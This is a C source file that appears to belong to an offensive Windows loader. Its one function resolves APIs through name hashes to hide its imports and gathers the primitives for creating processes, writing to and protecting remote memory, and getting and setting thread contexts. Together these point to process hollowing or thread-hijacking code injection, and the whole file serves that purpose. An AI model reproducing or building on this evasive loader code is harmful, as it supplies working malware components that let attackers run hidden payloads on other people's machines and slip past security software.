#include "../../includes/core/core.h"
#include "../../includes/api/apis.h"


BOOL LdrAllocateCoreStructsAndLoadApis() {
	HMODULE ntdll = GetModule(HASHED_ntdll);
	HMODULE kernel32 = GetModule(HASHED_kernel32);


	pLocalAlloc fnLocalAlloc = (pLocalAlloc)GetProc(kernel32, HASHED_LocalAlloc);
	if(!fnLocalAlloc)
		return FALSE;

	ldr = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(LdrInstance));
	if(!ldr)
		return FALSE;
	ldr->win32 = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Win32));
	ldr->modules = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Modules));
	ldr->config = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Config));
	if(!ldr->win32 || !ldr->modules || !ldr->config)
		return FALSE;
	ldr->win32->LocalAlloc = fnLocalAlloc;

	ldr->modules->ntdll    = ntdll;
	ldr->modules->kernel32 = kernel32;





	ldr->win32->GetProcAddress = (pGetProcAddress)GetProc(kernel32, HASHED_GetProcAddress);
	ldr->win32->LoadLibraryA = (pLoadLibraryA)GetProc(kernel32, HASHED_LoadLibraryA);
	ldr->win32->LocalFree = (pLocalFree)GetProc(kernel32, HASHED_LocalFree);
	ldr->win32->LocalReAlloc = (pLocalReAlloc)GetProc(kernel32, HASHED_LocalReAlloc);
	ldr->win32->RtlExitUserThread = (pRtlExitUserThread)GetProc(ntdll, HASHED_RtlExitUserThread);
	ldr->win32->CreateProcessA = (pCreateProcessA)GetProc(kernel32, HASHED_CreateProcessA);
	ldr->win32->NtResumeThread  = (pNtResumeThread)GetProc(ntdll, HASHED_NtResumeThread);
	ldr->win32->NtGetContextThread = (pNtGetContextThread)GetProc(ntdll, HASHED_NtGetContextThread);
	ldr->win32->NtSetContextThread = (pNtSetContextThread)GetProc(ntdll, HASHED_NtSetContextThread);
	ldr->win32->NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProc(ntdll, NTALLOCATEVIRTUALMEMORY_HASH);
	ldr->win32->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(ntdll, NTPROTECTVIRTUALMEMORY_HASH);
	ldr->win32->NtFlushInstructionCache = (pNtFlushInstructionCache)GetProc(ntdll, NTFLUSHINSTRUCTIONCACHE_HASH);
	ldr->win32->NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetProc(ntdll, HASHED_NtFreeVirtualMemory);
	ldr->win32->NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProc(ntdll, HASHED_NtWriteVirtualMemory);
	ldr->win32->CloseHandle = (pCloseHandle)GetProc(kernel32, HASHED_CloseHandle);
#ifdef LOAD_AND_LISTEN
	ldr->win32->CreateThread = (pCreateThread)GetProc(kernel32, HASHED_CreateThread);
	ldr->win32->RegisterWaitForSingleObject = (pRegisterWaitForSingleObject)GetProc(kernel32, HASHED_RegisterWaitForSingleObject);
	ldr->win32->FreeLibrary = (pFreeLibrary)GetProc(kernel32, HASHED_FreeLibrary);
	ldr->win32->NtDelayExecution = (pNtDelayExecution)GetProc(ntdll, HASHED_NtDelayExecution);
#endif

	return TRUE;
}